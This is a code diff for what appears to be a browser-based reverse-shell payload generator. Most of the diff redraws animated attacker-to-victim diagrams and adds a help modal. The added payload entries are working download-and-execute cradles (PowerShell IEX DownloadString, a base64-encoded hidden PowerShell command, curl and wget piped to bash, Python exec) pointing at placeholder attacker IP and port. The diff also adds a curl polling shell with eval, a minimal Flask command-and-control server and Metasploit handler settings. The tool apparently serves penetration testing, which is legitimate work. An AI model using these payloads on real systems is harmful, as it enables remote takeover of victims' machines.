+    cmd:"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\nIEX (New-Object Net.WebClient).DownloadString('https://{ip}:{port}/shell.ps1')" },
+  { name:'PowerShell Invoke-WebRequest cradle', meta:['windows','http'],
+    cmd:"Invoke-Expression (Invoke-WebRequest -Uri 'http://{ip}:{port}/shell.ps1' -UseBasicParsing).Content" },
+  { name:'PowerShell hidden HTTP cradle', meta:['windows','http'],
+    cmd:"powershell -nop -w hidden -enc $(echo \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\" | iconv -t UTF-16LE | base64 -w0)" },
+  { name:'curl bash HTTP cradle', meta:['linux','mac','http'],
+    cmd:'curl -fsSL http://{ip}:{port}/shell.sh | bash' },
+  { name:'wget bash HTTP cradle', meta:['linux','mac','http'],
+    cmd:'wget -qO- http://{ip}:{port}/shell.sh | bash' },
+  { name:'Python3 HTTP fetch+exec', meta:['linux','mac','windows','http'],
+    cmd:"python3 -c \"import urllib.request,os; exec(urllib.request.urlopen('http://{ip}:{port}/shell.py').read())\"" },
+  { name:'curl HTTP polling shell (bash)', meta:['linux','mac','http'],
+    cmd:'while true; do CMD=$(curl -sf http://{ip}:{port}/cmd); [ -n "$CMD" ] && eval "$CMD" | curl -sf -X POST --data-binary @- http://{ip}:{port}/out; sleep 2; done',
+    setup:[
+      { title:'Attacker — simple Flask C2', cmd:'# Install:\npip3 install flask\n# Minimal server:\npython3 -c "\nfrom flask import Flask,request\napp=Flask(__name__)\nCMD=[\'id\']\n@app.route(\'/cmd\')\ndef cmd(): return CMD[0]\n@app.route(\'/out\',methods=[\'POST\'])\ndef out(): print(request.data.decode()); CMD[0]=\'\'; return \'\'\napp.run(host=\'0.0.0.0\',port={port})\n"' },
+    ]
+  },
 
   // ── EXTRA from cheatsheet ──
   { name:'Xterm',          meta:['linux','mac'],     cmd:'xterm -display {ip}:1' },
@@ -1296,38 +1592,33 @@ let _dId = 0;
 
 function getDiagram(type, port) {
   const id = ++_dId;
-  const W = 460, H = 120;
+  // Laptop body: classic shape (w=64 h=44), centred at y=46 → body y=24..68
+  // Lines at y=28/46/64 all pass through the body; labels are compact single-line badges
+  const W = 460, H = 105;
   const ACX = 62, VCX = 398;
-  const LA = ACX + 40, RV = VCX - 40;
+  const LA = ACX + 32, RV = VCX - 32; // = body edges: 94 and 366
 
-  // ── Arrowhead markers
-  const mkr = (mid, col, flip) => {
-    const pts = flip ? `M7,0.5 L7,6.5 L0,3.5z` : `M0,0.5 L0,6.5 L7,3.5z`;
-    const rx  = flip ? 2 : 5;
-    return `<marker id="${mid}" markerWidth="7" markerHeight="7" refX="${rx}" refY="3.5" orient="auto"><path d="${pts}" fill="${col}"/></marker>`;
+  const mkr = (mid, col, pointsLeft) => {
+    const orient = pointsLeft ? '180' : '0';
+    return `<marker id="${mid}" markerWidth="7" markerHeight="7" refX="5" refY="3.5" orient="${orient}"><path d="M0,0.5 L0,6.5 L7,3.5z" fill="${col}"/></marker>`;
   };
 
-  // ── Animated flowing line: glow halo + dashed animated stroke + arrowhead
-  // dir: 'r' = left→right (dashoffset negative), 'l' = right→left (positive)
   const aline = (x1,y1,x2,y2, col, mEnd='', mStart='', speed=1.4, dash='8,5') => {
     const len = Math.hypot(x2-x1, y2-y1);
-    const dashTotal = 13; // 8+5
+    const dashTotal = 13;
     const dur = (len / (dashTotal * speed)).toFixed(2) + 's';
     const dir = x2 > x1 ? -dashTotal : dashTotal;
     const me = mEnd   ? ` marker-end="${mEnd}"`   : '';
     const ms = mStart ? ` marker-start="${mStart}"` : '';
     const da = `stroke-dasharray="${dash}"`;
     return (
-      // halo
       `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="6" stroke-opacity="0.13" ${da}/>` +
-      // animated dashes
       `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="1.6" ${da}${me}${ms}>` +
         `<animate attributeName="stroke-dashoffset" from="0" to="${dir}" dur="${dur}" repeatCount="indefinite"/>` +
       `</line>`
     );
   };
 
-  // ── Solid glowing line with pulse
   const solidLine = (x1,y1,x2,y2, col, mEnd='', mStart='') => {
     const me = mEnd   ? ` marker-end="${mEnd}"`   : '';
     const ms = mStart ? ` marker-start="${mStart}"` : '';
@@ -1339,7 +1630,6 @@ function getDiagram(type, port) {
     );
   };
 
-  // ── Moving dot packet along a path
   const packet = (x1,y1,x2,y2, col, delay='0s', dur='1.8s') =>
     `<circle r="2.5" fill="${col}" opacity="0.9">` +
       `<animate attributeName="cx" from="${x1}" to="${x2}" dur="${dur}" begin="${delay}" repeatCount="indefinite"/>` +
@@ -1347,28 +1637,30 @@ function getDiagram(type, port) {
       `<animate attributeName="opacity" values="0;1;1;0" dur="${dur}" begin="${delay}" repeatCount="indefinite"/>` +
     `</circle>`;
 
-  // ── Laptop with pulsing screen glow
+  // ── Classic laptop shape, body centred at y=46 → body y=24..68, screen y=29..63
   const laptop = (cx, sc, sf, lbl, sub) =>
-    `<rect x="${cx-32}" y="8" width="64" height="44" rx="3" fill="#080808" stroke="${sc}" stroke-width="1.4">` +
+    `<rect x="${cx-32}" y="24" width="64" height="44" rx="3" fill="#080808" stroke="${sc}" stroke-width="1.4">` +
       `<animate attributeName="stroke-opacity" values="1;0.5;1" dur="3s" repeatCount="indefinite"/>` +
     `</rect>` +
-    `<rect x="${cx-27}" y="13" width="54" height="34" rx="1" fill="${sf}">` +
+    `<rect x="${cx-27}" y="29" width="54" height="34" rx="1" fill="${sf}">` +
       `<animate attributeName="fill-opacity" values="1;0.7;1" dur="3s" repeatCount="indefinite"/>` +
     `</rect>` +
-    `<rect x="${cx-38}" y="52" width="76" height="5" rx="1" fill="${sc}" opacity="0.20"/>` +
-    `<rect x="${cx-44}" y="57" width="88" height="3" rx="1" fill="${sc}" opacity="0.08"/>` +
-    `<text x="${cx}" y="74" text-anchor="middle" font-family="monospace" font-size="9" fill="#555">${lbl}</text>` +
-    `<text x="${cx}" y="86" text-anchor="middle" font-family="monospace" font-size="8" fill="${sc}">${sub}</text>`;
+    `<rect x="${cx-38}" y="68" width="76" height="5" rx="1" fill="${sc}" opacity="0.20"/>` +
+    `<rect x="${cx-44}" y="73" width="88" height="3" rx="1" fill="${sc}" opacity="0.08"/>` +
+    `<text x="${cx}" y="84" text-anchor="middle" font-family="monospace" font-size="9" fill="#555">${lbl}</text>` +
+    `<text x="${cx}" y="93" text-anchor="middle" font-family="monospace" font-size="8" fill="${sc}">${sub}</text>`;
 
   const t = (x,y,txt,col,s=7.5) =>
     `<text x="${x}" y="${y}" text-anchor="middle" font-family="monospace" font-size="${s}" fill="${col}">${txt}</text>`;
 
-  const label = (x,y,main,sub,mc,sc2) =>
-    `${t(x,y,main,mc,7.5)}${t(x,y+10,sub,sc2,6.5)}`;
+  // ── Compact single-line badge ON the line; coloured border = line colour
+  // badge sits centred on lineY: rect from lineY-6 to lineY+7, text baseline at lineY+4
+  const label = (x, lineY, main, sub, mc) =>
+    `<rect x="${x-70}" y="${lineY-7}" width="140" height="14" fill="#060d06" stroke="${mc}" stroke-width="0.7" rx="2"/>` +
+    `${t(x, lineY+4, `${main}  ·  ${sub}`, mc, 6.5)}`;
 
   const bg = `<rect width="${W}" height="${H}" fill="#030a03" rx="3"/>`;
 
-  // ── Step badge
   const step = (x,y,n,col) =>
     `<rect x="${x-8}" y="${y-9}" width="16" height="12" rx="2" fill="${col}" opacity="0.18"/>` +
     `<text x="${x}" y="${y}" text-anchor="middle" font-family="monospace" font-size="8" fill="${col}" font-weight="bold">${n}</text>`;
@@ -1384,21 +1676,17 @@ function getDiagram(type, port) {
       </defs>`;
       const atk = laptop(ACX, '#4488ff', '#00091a', 'ATTACKER', `:${port} LISTEN`);
       const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', ':random');
-      // ① TCP connect-back — solid pulsing blue line victim→attacker
-      const c1 = solidLine(RV,26, LA,26, '#4488ff', `url(#lb${id})`);
-      // ② cmd — animated dashes attacker→victim (red)
-      const c2 = aline(LA,40, RV,40, '#ff4444', `url(#rr${id})`, '', 1.2);
-      // ③ output — animated dashes victim→attacker (orange)
-      const c3 = aline(RV,54, LA,54, '#ff6622', '', `url(#lr${id})`, 1.0);
-      // packets
-      const p1 = packet(RV,26, LA,26, '#88aaff', '0s',   '1.6s');
-      const p2 = packet(LA,40, RV,40, '#ff6666', '0.4s', '1.9s');
-      const p3 = packet(RV,54, LA,54, '#ff9955', '0.8s', '2.1s');
+      const c1 = solidLine(RV,28, LA,28, '#4488ff', `url(#lb${id})`);
+      const c2 = aline(LA,46, RV,46, '#ff4444', `url(#rr${id})`, '', 1.2);
+      const c3 = aline(RV,64, LA,64, '#ff6622', `url(#lr${id})`, '', 1.0);
+      const p1 = packet(RV,28, LA,28, '#88aaff', '0s',   '1.6s');
+      const p2 = packet(LA,46, RV,46, '#ff6666', '0.4s', '1.9s');
+      const p3 = packet(RV,64, LA,64, '#ff9955', '0.8s', '2.1s');
       return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${c1}${c2}${c3}${p1}${p2}${p3}
-        ${label(243,22,'① TCP connect-back','victim → attacker','#6699ff','#334488')}
-        ${label(243,37,'② commands','attacker → victim','#ff6666','#883333')}
-        ${label(243,56,'③ output','victim → attacker','#ff9955','#884422')}
-        ${t(230,112,'victim initiates — bypasses inbound firewall rules','#333',7)}
+        ${label(230,28,'① TCP connect-back','victim → attacker','#4488ff')}
+        ${label(230,46,'② commands','attacker → victim','#ff4444')}
+        ${label(230,64,'③ output','victim → attacker','#ff6622')}
+        ${t(230,101,'victim initiates — bypasses inbound firewall rules','#2a3a2a',6.5)}
       </svg>`;
     }
 
@@ -1411,17 +1699,17 @@ function getDiagram(type, port) {
       </defs>`;
       const atk = laptop(ACX, '#4488ff', '#00091a', 'ATTACKER', 'connects');
       const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', `:${port} LISTEN`);
-      const c1 = solidLine(LA,26, RV,26, '#4488ff', `url(#rb${id})`);
-      const c2 = aline(LA,40, RV,40, '#ff4444', `url(#rr${id})`, '', 1.2);
-      const c3 = aline(RV,54, LA,54, '#ff6622', '', `url(#lr${id})`, 1.0);
-      const p1 = packet(LA,26, RV,26, '#88aaff', '0s',   '1.6s');
-      const p2 = packet(LA,40, RV,40, '#ff6666', '0.5s', '1.9s');
-      const p3 = packet(RV,54, LA,54, '#ff9955', '0.9s', '2.0s');
+      const c1 = solidLine(LA,28, RV,28, '#4488ff', `url(#rb${id})`);
+      const c2 = aline(LA,46, RV,46, '#ff4444', `url(#rr${id})`, '', 1.2);
+      const c3 = aline(RV,64, LA,64, '#ff6622', `url(#lr${id})`, '', 1.0);
+      const p1 = packet(LA,28, RV,28, '#88aaff', '0s',   '1.6s');
+      const p2 = packet(LA,46, RV,46, '#ff6666', '0.5s', '1.9s');
+      const p3 = packet(RV,64, LA,64, '#ff9955', '0.9s', '2.0s');
       return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${c1}${c2}${c3}${p1}${p2}${p3}
-        ${label(243,22,'① attacker connects','to victim port ${port}','#6699ff','#334488').replace('${port}',port)}
-        ${label(243,37,'② commands','attacker → victim','#ff6666','#883333')}
-        ${label(243,56,'③ output','victim → attacker','#ff9955','#884422')}
-        ${t(230,112,'victim listens — attacker must reach victim port directly','#333',7)}
+        ${label(230,28,'① attacker connects',`to victim :${port}`,'#4488ff')}
+        ${label(230,46,'② commands','attacker → victim','#ff4444')}
+        ${label(230,64,'③ output','victim → attacker','#ff6622')}
+        ${t(230,101,'victim listens — attacker must reach victim port directly','#2a3a2a',6.5)}
       </svg>`;
     }
 
@@ -1432,31 +1720,33 @@ function getDiagram(type, port) {
         ${mkr(`lg${id}`, '#00cc44', true)}
         ${mkr(`rg${id}`, '#00cc44', false)}
       </defs>`;
-      const atk = laptop(55,  '#00cc44', '#001400', 'ATTACKER', 'NS record');
-      const vic = laptop(405, '#ff4444', '#1a0000', 'VICTIM',   'DNS client');
+      const atk = laptop(ACX, '#00cc44', '#001400', 'ATTACKER', 'NS record');
+      const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM',   'DNS client');
+      // DNS relay box: same height as laptop body (y=24..68), centred between them
       const dnsBox =
-        `<rect x="${DNX-38}" y="12" width="76" height="38" rx="4" fill="#0a0a02" stroke="#888800" stroke-width="1.2">` +
+        `<rect x="${DNX-30}" y="24" width="60" height="44" rx="4" fill="#0a0a02" stroke="#888800" stroke-width="1.2">` +
           `<animate attributeName="stroke-opacity" values="1;0.4;1" dur="2.5s" repeatCount="indefinite"/>` +
         `</rect>` +
-        `${t(DNX,27,'DNS','#aaaa00',9)}${t(DNX,40,'nameserver','#555',7)}` +
-        `${t(DNX,78,'your domain NS','#444',7)}`;
-      // victim → DNS nameserver (query)
-      const v2d = aline(363,24, DNX+42,24, '#00cc44', `url(#lg${id})`, '', 1.3);
-      // DNS → attacker (forward)
-      const d2a = aline(DNX-42,24, 93,24,  '#00cc44', `url(#lg${id})`, '', 1.3);
-      // responses (dashed, slower)
-      const r1 = aline(93,38,  DNX-42,38, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
-      const r2 = aline(DNX+42,38, 363,38, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
-      const p1 = packet(363,24, DNX+42,24, '#66ff88', '0s',   '1.5s');
-      const p2 = packet(DNX-42,24, 93,24,  '#66ff88', '0.3s', '1.5s');
-      const p3 = packet(93,38,  DNX-42,38, '#44cc66', '0.7s', '2.0s');
-      const p4 = packet(DNX+42,38, 363,38, '#44cc66', '1.0s', '2.0s');
+        `${t(DNX,40,'DNS','#aaaa00',9)}${t(DNX,52,'relay','#555',7)}` +
+        `${t(DNX,86,'your domain NS','#444',6.5)}`;
+      // Query: victim → DNS → attacker (y=34)
+      const v2d = aline(RV,34, DNX+34,34, '#00cc44', `url(#lg${id})`, '', 1.3);
+      const d2a = aline(DNX-34,34, LA,34, '#00cc44', `url(#lg${id})`, '', 1.3);
+      // Response: attacker → DNS → victim (y=58)
+      const r1  = aline(LA,58, DNX-34,58, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
+      const r2  = aline(DNX+34,58, RV,58, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
+      const p1 = packet(RV,34, DNX+34,34, '#66ff88', '0s',   '1.5s');
+      const p2 = packet(DNX-34,34, LA,34, '#66ff88', '0.4s', '1.5s');
+      const p3 = packet(LA,58, DNX-34,58, '#44cc66', '0.8s', '2.0s');
+      const p4 = packet(DNX+34,58, RV,58, '#44cc66', '1.1s', '2.0s');
+      const lx1 = Math.round((RV + DNX+34) / 2);
+      const lx2 = Math.round((LA + DNX-34) / 2);
       return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${dnsBox}${v2d}${d2a}${r1}${r2}${p1}${p2}${p3}${p4}
-        ${t(155,18,'① query (XSalsa20)','#44cc66',7)}
-        ${t(310,18,'NS forward','#44cc66',7)}
-        ${t(155,50,'② response (cmd)','#33aa55',7)}
-        ${t(310,50,'NS reply','#33aa55',7)}
-        ${t(230,112,'only UDP/TCP 53 needed — bypasses most firewalls','#333',7)}
+        ${t(lx1,27,'① query (XSalsa20)','#44cc66',6.5)}
+        ${t(lx2,27,'NS forward','#44cc66',6.5)}
+        ${t(lx1,51,'② response (cmd)','#33aa55',6.5)}
+        ${t(lx2,51,'NS reply','#33aa55',6.5)}
+        ${t(230,101,'only UDP/TCP 53 needed — bypasses most firewalls','#2a3a2a',6.5)}
       </svg>`;
     }
 
@@ -1469,17 +1759,17 @@ function getDiagram(type, port) {
       </defs>`;
       const atk = laptop(ACX, '#e0c030', '#120e00', 'ATTACKER', `HTTP :${port}`);
       const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', 'polling');
-      const g1 = aline(RV,24, LA,24, '#e0c030', `url(#lo${id})`, '', 1.1);
-      const g2 = aline(LA,38, RV,38, '#e0c030', `url(#ro${id})`, '', 0.9, '6,4');
-      const g3 = aline(RV,52, LA,52, '#ff6622', '', `url(#lr${id})`, 1.0);
-      const p1 = packet(RV,24, LA,24, '#ffe060', '0s',   '1.7s');
-      const p2 = packet(LA,38, RV,38, '#ffe060', '0.6s', '2.0s');
-      const p3 = packet(RV,52, LA,52, '#ff9955', '1.0s', '1.9s');
+      const g1 = aline(RV,28, LA,28, '#e0c030', `url(#lo${id})`, '', 1.1);
+      const g2 = aline(LA,46, RV,46, '#e0c030', `url(#ro${id})`, '', 0.9, '6,4');
+      const g3 = aline(RV,64, LA,64, '#ff6622', `url(#lr${id})`, '', 1.0);
+      const p1 = packet(RV,28, LA,28, '#ffe060', '0s',   '1.7s');
+      const p2 = packet(LA,46, RV,46, '#ffe060', '0.6s', '2.0s');
+      const p3 = packet(RV,64, LA,64, '#ff9955', '1.0s', '1.9s');
       return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${g1}${g2}${g3}${p1}${p2}${p3}
-        ${label(243,20,'① GET /token','victim polls for cmd','#d0b020','#806800')}
-        ${label(243,35,'② HTTP 200','encoded cmd payload','#d0b020','#806800')}
-        ${label(243,54,'③ POST /token','encoded output','#ff8840','#804420')}
-        ${t(230,112,'Authorization header = C2 token — blends with HTTPS','#333',7)}
+        ${label(230,28,'① GET /token','victim polls for cmd','#e0c030')}
+        ${label(230,46,'② HTTP 200','encoded cmd payload','#e0c030')}
+        ${label(230,64,'③ POST /token','encoded output','#ff6622')}
+        ${t(230,101,'Authorization header = C2 token — blends with HTTPS','#2a3a2a',6.5)}
       </svg>`;
     }
 
@@ -1491,28 +1781,26 @@ function getDiagram(type, port) {
       </defs>`;
       const atk = laptop(ACX, '#e0c030', '#120e00', 'ATTACKER', `:${port} LISTEN`);
       const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', ':random');
-      // TLS handshake — solid pulsing gold
-      const h1 = solidLine(RV,22, LA,22, '#e0c030', `url(#lo${id})`);
-      // encrypted channels — thick animated
-      const e1 = aline(LA,36, RV,36, '#e0c030', `url(#ro${id})`, '', 1.4, '10,4');
-      const e2 = aline(RV,50, LA,50, '#e0c030', `url(#lo${id})`, '', 1.1, '10,4');
-      // lock shapes
+      const h1 = solidLine(RV,28, LA,28, '#e0c030', `url(#lo${id})`);
+      const e1 = aline(LA,46, RV,46, '#e0c030', `url(#ro${id})`, '', 1.4, '10,4');
+      const e2 = aline(RV,64, LA,64, '#e0c030', `url(#lo${id})`, '', 1.1, '10,4');
+      // Lock icons on lines 2+3, outside the badge area (badge x=160..300)
       const lock = (x,y) =>
-        `<rect x="${x-5}" y="${y}" width="10" height="8" rx="1.5" fill="#c0a020">` +
+        `<rect x="${x-5}" y="${y-4}" width="10" height="8" rx="1.5" fill="#c0a020">` +
           `<animate attributeName="fill-opacity" values="1;0.5;1" dur="2s" repeatCount="indefinite"/>` +
         `</rect>` +
-        `<path d="M${x-3},${y} Q${x-3},${y-4} ${x},${y-4} Q${x+3},${y-4} ${x+3},${y}" stroke="#c0a020" stroke-width="1.5" fill="none"/>` +
-        `<circle cx="${x}" cy="${y+4}" r="1.5" fill="#030a03"/>`;
-      const p1 = packet(RV,22, LA,22, '#ffe080', '0s',   '1.6s');
-      const p2 = packet(LA,36, RV,36, '#e0c030', '0.3s', '1.8s');
-      const p3 = packet(RV,50, LA,50, '#e0c030', '0.7s', '2.0s');
+        `<path d="M${x-3},${y-4} Q${x-3},${y-8} ${x},${y-8} Q${x+3},${y-8} ${x+3},${y-4}" stroke="#c0a020" stroke-width="1.5" fill="none"/>` +
+        `<circle cx="${x}" cy="${y}" r="1.5" fill="#030a03"/>`;
+      const p1 = packet(RV,28, LA,28, '#ffe080', '0s',   '1.6s');
+      const p2 = packet(LA,46, RV,46, '#e0c030', '0.3s', '1.8s');
+      const p3 = packet(RV,64, LA,64, '#e0c030', '0.7s', '2.0s');
       return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${h1}${e1}${e2}
-        ${lock(172,38)}${lock(230,38)}${lock(288,38)}
+        ${lock(125,46)}${lock(335,46)}${lock(125,64)}${lock(335,64)}
         ${p1}${p2}${p3}
-        ${label(243,18,'① TLS/SSL handshake','victim → attacker','#d0b020','#806800')}
-        ${label(243,33,'② encrypted cmd','attacker → victim','#d0b020','#806800')}
-        ${label(243,52,'③ encrypted output','victim → attacker','#d0b020','#806800')}
-        ${t(230,112,'AES/TLS — indistinguishable from HTTPS to IDS/IPS','#333',7)}
+        ${label(230,28,'① TLS/SSL handshake','victim → attacker','#e0c030')}
+        ${label(230,46,'② 🔒 encrypted cmd','attacker → victim','#e0c030')}
+        ${label(230,64,'③ 🔒 encrypted output','victim → attacker','#e0c030')}
+        ${t(230,101,'AES/TLS — indistinguishable from HTTPS to IDS/IPS','#2a3a2a',6.5)}
       </svg>`;
     }
 
@@ -1520,10 +1808,10 @@ function getDiagram(type, port) {
   }
 }
 
-function getDiagType(item) {
+function getDiagType(item, containerId) {
   const n = item.name.toLowerCase();
   const m = item.meta || [];
-  if (m.includes('bind')) return 'bind';
+  if (containerId === 'list-bind' || m.includes('bind')) return 'bind';
   if (n.includes('dns') || n.includes('chashell')) return 'dns';
   if (n.includes('hoaxshell')) return 'http';
   if (item.encrypted) return 'enc_reverse';
@@ -1562,19 +1850,63 @@ function showToast() {
 
 // ── LISTENER ─────────────────────────────────────────────────────────────────
 
-function updateListener() {
+const MSF_PAYLOAD = {
+  '/bin/bash':    'linux/x64/meterpreter/reverse_tcp',
+  '/bin/sh':      'linux/x64/shell_reverse_tcp',
+  '/bin/zsh':     'linux/x64/meterpreter/reverse_tcp',
+  'cmd.exe':      'windows/x64/shell/reverse_tcp',
+  'powershell.exe':'windows/x64/meterpreter/reverse_tcp',
+};
+
+function getListenerDefs(shell) {
   const ip = getIP(), port = getPort();
-  const type = document.getElementById('listener').value;
-  const cmds = {
-    nc:        `nc -lvnp ${port}`,
-    ncat:      `ncat -lvnp ${port}`,
-    socat:     `socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:${port}`,
-    rlwrap:    `rlwrap nc -lvnp ${port}`,
-    msf:       `use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST ${ip}\nset LPORT ${port}\nrun`,
-    pwncat_cs: `pwncat-cs -lp ${port}`,
-    pwncat_cy: `pwncat -l -p ${port}`,
-  };
-  document.getElementById('listener-cmd').textContent = cmds[type] || cmds.nc;
+  const isWin = shell === 'cmd.exe' || shell === 'powershell.exe';
+  const payload = MSF_PAYLOAD[shell] || 'linux/x64/meterpreter/reverse_tcp';
+
+  const defs = [
+    { group: '── Netcat ──', opts: [
+      { v:'nc_linux',     l:'nc · Linux/GNU (-lvnp)',   cmd:`nc -lvnp ${port}` },
+      { v:'nc_bsd',       l:'nc · macOS/BSD (-l port)', cmd:`nc -l ${port}` },
+      { v:'ncat',         l:'ncat · cross-platform',    cmd:`ncat -lvnp ${port}` },
+      ...(!isWin ? [
+        { v:'rlwrap_linux', l:'rlwrap nc · Linux (TTY)',  cmd:`rlwrap nc -lvnp ${port}` },
+        { v:'rlwrap_bsd',   l:'rlwrap nc · macOS (TTY)',  cmd:`rlwrap nc -l ${port}` },
+      ] : []),
+    ]},
+    { group: '── Other ──', opts: [
+      ...(!isWin ? [
+        { v:'socat', l:'socat (fully interactive)', cmd:`socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:${port}` },
+      ] : []),
+      { v:'msf',       l:'Metasploit handler',       cmd:`use exploit/multi/handler\nset PAYLOAD ${payload}\nset LHOST ${ip}\nset LPORT ${port}\nrun` },
+      { v:'pwncat_cs', l:'pwncat-cs (calebstewart)', cmd:`pwncat-cs -lp ${port}` },
+      { v:'pwncat_cy', l:'pwncat (cytopia)',          cmd:`pwncat -l -p ${port}` },
+    ]},
+  ];
+  return defs;
+}
+
+function refreshListenerOptions(shell) {
+  const sel = document.getElementById('listener');
+  const cur = sel.value;
+  const defs = getListenerDefs(shell);
+  sel.innerHTML = defs.map(g =>
+    `<optgroup label="${g.group}">${g.opts.map(o =>
+      `<option value="${o.v}"${o.v === cur ? ' selected' : ''}>${o.l}</option>`
+    ).join('')}</optgroup>`
+  ).join('');
+  // fall back to first option if current selection was removed
+  const allVals = defs.flatMap(g => g.opts.map(o => o.v));
+  if (!allVals.includes(sel.value)) sel.value = allVals[0];
+  updateListener();
+}
+
+function updateListener() {
+  const shell = document.getElementById('shell').value;
+  const type  = document.getElementById('listener').value;
+  const defs  = getListenerDefs(shell);
+  const all   = defs.flatMap(g => g.opts);
+  const entry = all.find(o => o.v === type) || all[0];
+  document.getElementById('listener-cmd').textContent = entry.cmd;
 }
 
 // ── RENDER ───────────────────────────────────────────────────────────────────
@@ -1674,7 +2006,7 @@ function buildList(data, containerId, countId) {
         <div class="shell-body" id="${id}">
           <div class="obf-mode-bar" id="${id}-modebar" style="display:none"></div>
           <pre><code id="${id}-code">${highlight(cmd)}</code></pre>
-          <div class="shell-diagram" data-dtype="${getDiagType(item)}" data-dport="${getPort()}"></div>
+          <div class="shell-diagram" data-dtype="${getDiagType(item, containerId)}" data-dport="${getPort()}"></div>
           ${setupHtml}
         </div>
       </div>`;
@@ -2044,6 +2376,221 @@ function toggleLotl(id) {
 
 // ── TABS ─────────────────────────────────────────────────────────────────────
 
+// ── HELP MODAL ───────────────────────────────────────────────────────────────
+
+const HELP_CONTENT = (() => {
+  // Shared helpers — fixed orient (same approach as inline diagrams)
+  const mkrH = (id, col, pointsLeft) => {
+    const orient = pointsLeft ? '180' : '0';
+    return `<marker id="${id}" markerWidth="10" markerHeight="10" refX="7" refY="5" orient="${orient}"><path d="M0,1 L0,9 L10,5z" fill="${col}"/></marker>`;
+  };
+  const laptopH = (cx, sc, sf, lbl, sub) =>
+    `<rect x="${cx-44}" y="12" width="88" height="58" rx="4" fill="#080808" stroke="${sc}" stroke-width="1.8"/>` +
+    `<rect x="${cx-38}" y="18" width="76" height="46" rx="2" fill="${sf}"/>` +
+    `<rect x="${cx-52}" y="70" width="104" height="7" rx="2" fill="${sc}" opacity="0.2"/>` +
+    `<rect x="${cx-58}" y="77" width="116" height="4" rx="2" fill="${sc}" opacity="0.1"/>` +
+    `<text x="${cx}" y="97" text-anchor="middle" font-family="monospace" font-size="11" fill="#666">${lbl}</text>` +
+    `<text x="${cx}" y="112" text-anchor="middle" font-family="monospace" font-size="10" fill="${sc}">${sub}</text>`;
+  const halo = (x1,y1,x2,y2,col,dash='') =>
+    `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="6" stroke-opacity="0.15"${dash?` stroke-dasharray="${dash}"`:''}/>`;
+  const lineH = (x1,y1,x2,y2,col,mid,dash='') =>
+    halo(x1,y1,x2,y2,col,dash) +
+    `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="2"${dash?` stroke-dasharray="${dash}"`:''} marker-end="url(#${mid})"/>`;
+  // Badge label ON the line
+  const badgeH = (x,y,txt,col) =>
+    `<rect x="${x-130}" y="${y-8}" width="260" height="15" fill="#060d06" stroke="${col}" stroke-width="0.6" rx="2"/>` +
+    `<text x="${x}" y="${y+4}" text-anchor="middle" font-family="monospace" font-size="9" fill="${col}">${txt}</text>`;
+  const noteH = (W,H,txt) =>
+    `<text x="${W/2}" y="${H-10}" text-anchor="middle" font-family="monospace" font-size="8" fill="#333">${txt}</text>`;
+
+  return {
+  reverse: {
+    title: '► REVERSE SHELL — how it works',
+    svg: () => {
+      const W=620, H=160, ACX=80, VCX=540, LA=ACX+44, RV=VCX-44;
+      const MID = (LA+RV)/2;
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">
+        <rect width="${W}" height="${H}" fill="#030a03" rx="6"/>
+        <defs>${mkrH('rv_lb','#4488ff',true)}${mkrH('rv_rr','#ff4444',false)}${mkrH('rv_lo','#ff6622',true)}</defs>
+        ${laptopH(ACX,'#4488ff','#00091a','ATTACKER',':4444 LISTEN')}
+        ${laptopH(VCX,'#ff4444','#1a0000','VICTIM',':random')}
+        ${lineH(RV,32, LA,32, '#4488ff','rv_lb')}
+        ${lineH(LA,52, RV,52, '#ff4444','rv_rr','6,4')}
+        ${lineH(RV,70, LA,70, '#ff6622','rv_lo','6,4')}
+        ${badgeH(MID,32,'① TCP connect-back  ·  victim → attacker','#4488ff')}
+        ${badgeH(MID,52,'② commands  ·  attacker → victim','#ff4444')}
+        ${badgeH(MID,70,'③ output  ·  victim → attacker','#ff6622')}
+        ${noteH(W,H,'Victim initiates — works behind NAT, bypasses inbound firewall rules')}
+      </svg>`;
+    },
+    steps: [
+      ['①', '<strong>Attacker</strong> starts a listener on a predefined port (e.g. <strong>nc -lvnp 4444</strong>)'],
+      ['②', '<strong>Victim</strong> executes the payload — opens a TCP connection back to the attacker\'s IP:port using a random source port'],
+      ['③', 'Attacker receives the connection and sends <strong>commands</strong> through the established channel'],
+      ['④', 'Victim executes commands and sends back <strong>output</strong>'],
+    ],
+    note: '<span>Key advantage:</span> The victim initiates the outbound connection — this bypasses inbound firewall rules and works behind NAT. Most firewalls allow outbound traffic freely.',
+    extras: [
+      {
+        title: '🔒 ENCRYPTED REVERSE SHELL — same flow, encrypted channel',
+        svg: () => {
+          const W=620, H=160, ACX=80, VCX=540, LA=ACX+44, RV=VCX-44;
+          const MID = (LA+RV)/2;
